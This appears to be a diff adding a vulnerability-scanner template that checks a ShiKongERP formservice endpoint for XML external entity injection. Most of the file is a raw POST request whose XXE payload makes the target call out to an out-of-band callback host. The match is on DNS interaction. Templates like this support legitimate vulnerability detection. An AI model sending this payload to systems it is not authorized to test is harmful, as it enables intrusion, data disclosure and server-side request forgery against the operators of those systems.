@@ -1,0 +1,35 @@
+id: ShiKongERP-formservice-XMLInjection
+
+info:
+  name: ShiKongERP-formservice-XMLInjection
+  author: iSee857
+  severity: high
+  description: |
+    ShiKongERP-formservice-XMLInjection
+  metadata:
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=richclient.openForm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY>
+        <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]>
+        <foo>&xxe;</foo>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: status
+        status:
+          - 200
